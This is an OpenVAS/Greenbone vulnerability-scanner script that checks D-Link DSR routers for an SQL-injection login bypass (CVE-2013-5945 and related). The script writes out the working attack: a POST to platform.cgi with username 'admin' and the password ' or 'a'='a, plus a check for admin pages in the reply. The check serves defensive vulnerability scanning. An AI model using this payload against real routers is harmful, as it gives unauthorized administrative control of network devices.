# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103862");
  script_cve_id("CVE-2013-5945", "CVE-2013-5946", "CVE-2013-7004", "CVE-2013-7005");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("D-Link DSR Router Series SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64172");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/30062/");

  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-04-23 18:13:00 +0000 (Fri, 23 Apr 2021)");
  script_tag(name:"creation_date", value:"2013-12-23 15:10:36 +0100 (Mon, 23 Dec 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Embedded_HTTP_Server/banner");

  script_tag(name:"impact", value:"A successful exploit may allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities
  in the underlying database.");

  script_tag(name:"vuldetect", value:"Try to login into the remote D-Link DSR Router using sql injection attack.");

  script_tag(name:"insight", value:"It was possible to login into the remote D-Link DSR Router using
  `admin` as username and `' or 'a'='a` as password.");

  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory
  for more information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"D-Link DSR Router Series are prone to an SQL-injection vulnerability.");

  script_tag(name:"affected", value:"D-Link DSR-150 (Firmware < v1.08B44)

  D-Link DSR-150N (Firmware < v1.05B64)

  D-Link DSR-250 and DSR-250N (Firmware < v1.08B44)

  D-Link DSR-500 and DSR-500N (Firmware < v1.08B77)

  D-Link DSR-1000 and DSR-1000N (Firmware < v1.08B77)");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if("Server: Embedded HTTP Server" >!< banner && "Unified Services Router" >!< banner)
  exit(0);

useragent = http_get_user_agent();

foreach dir (make_list("/scgi-bin/", "/")) {

  url = dir + 'platform.cgi';
  req = http_get(item:url, port:port);
  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if("Unified Services Router" >!< buf)continue;

  post = "thispage=index.htm&Users.UserName=admin&Users.Password=%27+or+%27a%27%3D%27a&button.login.Users.deviceStatus=Login&Login.userAgent=VTTest";
  len = strlen(post);
  host = http_host_name(port:port);

  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Referer: http://' + host + url + '?page=index.htm\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n\r\n' +
        post;

  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if(("adminSettings.htm" >< buf && ">Logout<" >< buf) || (">User already logged in<" >< buf)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
